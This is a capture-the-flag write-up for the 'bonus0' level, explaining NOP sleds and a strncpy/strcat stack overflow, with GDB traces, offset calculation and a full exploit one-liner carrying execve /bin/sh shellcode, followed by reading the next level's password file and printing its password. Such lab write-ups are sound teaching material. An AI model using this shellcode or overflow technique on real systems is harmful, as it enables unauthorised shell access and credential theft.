# bonus0

To solve this level, we need to learn a new concept: the **NOP (No Operation)** instruction. A NOP instruction tells the processor to do nothing for one instruction cycle. In x86 assembly, the standard NOP instruction is represented by the byte value `0x90`.

### Why are NOPs useful?

Suppose we have a shellcode payload that is 21 bytes long, and we need to execute it. If we know the exact address of the shellcode in memory, we can point the instruction pointer (EIP) directly to it. However, if the address shifts slightly (e.g., due to stack environment variance), we might land in the middle of our shellcode, causing a crash.

To prevent this, we prepend a "NOP sled" (a sequence of `0x90` bytes) before our shellcode. If the EIP lands anywhere on this NOP sled, it will safely execute the NOPs one-by-one, "sliding" down until it hits the real shellcode. This increases our margin of error.

### Vulnerability Analysis

Let's examine the structure of `pp` and `p`:
- `pp` calls `p` twice, reading 20 bytes into `first_word` and 20 bytes into `second_word` using `strncpy(dest, input_buf, 20)`.
- **The Bug**: `strncpy` does not null-terminate the destination buffer if the source is 20 bytes or longer.
- When `pp` executes `strcpy(output, first_word)`, since `first_word` is not null-terminated, `strcpy` continues reading into the adjacent `second_word` buffer on the stack.
- `pp` then appends a space and executes `strcat(output, second_word)`. This concatenation overflows the 54-byte `final_buffer` in `main`, overwriting the saved return address.

### Disassembling and Debugging

We disassemble `p` and `pp` in GDB:
```text
(gdb) disassemble p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   ebp
   0x080484b5 <+1>:	mov    ebp,esp
   ...
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   ...
(gdb) disassemble pp
Dump of assembler code for function pp:
   0x0804851e <+0>:	push   ebp
   0x0804851f <+1>:	mov    ebp,esp
   ...
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   ...
```

We run the binary in GDB with a 20-character pattern for both inputs:
```text
Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```
The crash occurs at `0x41336141` (`A1a3`), which gives an offset of exactly **9** bytes inside the concatenated string.

### Finding the Buffer Address

The disassembly of `p` shows that it reads up to `0x1000` (4096) bytes into a stack buffer at `ebp-0x1008`. This is an excessive size, giving us plenty of space to store a large NOP sled and shellcode.

We find the buffer address by placing a breakpoint at `p+50` (`0x080484e6`) in GDB:
```text
(gdb) break *0x080484e6
(gdb) run
Breakpoint 1, 0x080484e6 in p ()
(gdb) x $ebp-0x1008
0xbfffe680:	0x0000000a
```

The stack buffer resides at `0xbfffe680`. Because stack addresses shift slightly outside GDB, we add a padding offset of 80 bytes, aiming for `0xbfffe680 + 80 = 0xbfffe6d0`.

### Crafting the Payload

1. **First input** (for `first_word`): A NOP sled of 100 bytes followed by our 21-byte shellcode:
   `\x90` * 100 + shellcode
2. **Second input** (for `second_word`): 9 bytes of padding followed by our target address `0xbfffe6d0`:
   `"A"` * 9 + `0xbfffe6d0`

Using `[::-1]` to format the target address in little-endian representation (`\xbf\xff\xe6\xd0` reversed), we execute the exploit:
```bash
(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "a" * 9 + "\xbf\xff\xe6\xd0"[::-1] + "7"*7'; cat) | ./bonus0
```

This grants a shell as `bonus1` and allows us to read the password:
```bash
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
